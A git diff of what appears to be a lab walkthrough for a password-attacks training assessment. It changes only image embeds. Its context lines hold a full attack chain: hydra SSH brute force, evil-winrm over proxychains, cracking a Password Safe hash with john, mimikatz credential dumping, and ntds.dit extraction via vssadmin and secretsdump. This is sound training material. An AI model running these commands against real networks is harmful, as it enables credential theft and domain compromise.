@@ -13,7 +13,8 @@ It appears that only port 22 (SSH) is open so we will attempt to login with the 
 
 `hydra -L bjayde.txt -p 'Texas123!@#' ssh://<DMZ01 IP>`
 
-![[hydra-ss.png|700]]
+
+<img src="images/hydra-ss.png" alt="Hydra output" width="700">
 
 As we have found valid credentials for Betty Jayde we can now ssh into DMZ01.
 
@@ -41,13 +42,15 @@ Since JUMP01 acts as an intermediary into the internal network, we can route the
 
 `proxychains evil-winrm -i 172.16.119.7 -u hwilliam -p '<REDACTED PASS>'`
 
-![[evilwinrm-hwilliam.png]]
+
+<img src="images/evilwinrm-hwilliam.png" alt="Hydra output" width="700">
 
 The login succeeded and we now have shell access to JUMP01. Unfortunately, nothing useful is found locally on the jump server so we instead check any smb shares the hwilliam user has access to which are available on FILE01.
 
 `proxychains nxc smb <FILE01 IP> -u hwilliam -p '<REDACTED PASS>' --shares`
 
-![[hwilliam-share-perms.png]]
+
+<img src="images/hwilliam-share-perms.png" alt="Hydra output" width="700">
 
 hwilliam has access to HR, Private and transfer shares. We can start with enumerating HR.
 
@@ -65,11 +68,13 @@ For us this means that we need the Master Password. We can use the tool **pwsafe
 
 `john --wordlist=/usr/share/wordlists/rockyou.txt master.hash`
 
-![[pwsafe-masterpass-cracked.png]]
+
+<img src="images/pwsafe-masterpass-cracked.png" alt="Hydra output" width="700">
 
 We find the master password, gaining the usernames and passwords of two new users.
 
-![[content-of-psafe-file.png]]
+
+<img src="images/content-of-psafe-file.png" alt="Hydra output" width="700">
 
 We can retry gaining access to JUMP01 again using these new users since hwilliam didn't have access.
 
@@ -77,7 +82,8 @@ We can retry gaining access to JUMP01 again using these new users since hwilliam
 
 Check local user privileges with `net localgroup`.
 
-![[bdavid-localgroup-file01.png]]
+
+<img src="images/bdavid-localgroup-file01.png" alt="Hydra output" width="700">
 
 
 ## Credential Dumping:
@@ -90,7 +96,8 @@ As we already have shell access via evilwinrm we can use its inbuilt upload func
 
 `.\mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords" exit`
 
-![[stom-user-hash.png]]
+
+<img src="images/stom-user-hash.png" alt="Hydra output" width="700">
 
 
 If you needed to go via the download route:
@@ -116,7 +123,8 @@ Now that we have obtained an NTLM hash for the stom user we could attempt to per
 ## Domain Administrator Compromise:
 The login succeeds. Next, we check privileges that the stom user has:
 
-![[stom-user-group-perms.png]]
+
+<img src="images/stom-user-group-perms.png" alt="Hydra output" width="700">
 
 
 Fortunately, stom is part of the Domain Admins group, which we will use for the next step. We will firstly need to create a shadow copy of the drive containing the ntds.dit which is usually the C drive.
@@ -128,7 +136,8 @@ First create a temporary directory to store the ntds.dit file:
 Next create the shadow copy of the C drive:
 `vssadmin CREATE SHADOW /For=C:`
 
-![[vss-shadow-copy.png]]
+
+<img src="images/vss-shadow-copy.png" alt="Hydra output" width="700">
 
 Then move the ntds.dit file from the shadow copy to a directory on the main drive to prep it to be moved to our attack host. Use the volume name that was provided to you from the previous command (underlined in the above image) as yours could be different.
 ```powershell
@@ -148,7 +157,8 @@ Use the windows registry to save a copy of the system hive:
 Then extract the domain administrators NTLM hash from the ntds.dit file using impacket-secretsdump to complete the password attacks module assessment:
 `impacket-secretsdump -ntds NTDS.dit -system system.save LOCAL`
 
-![[admin-hash-retrieved.png]]
+
+<img src="images/admin-hash-retrieved.png" alt="Hydra output" width="700">
 
 
 ## Attack Path Summary 
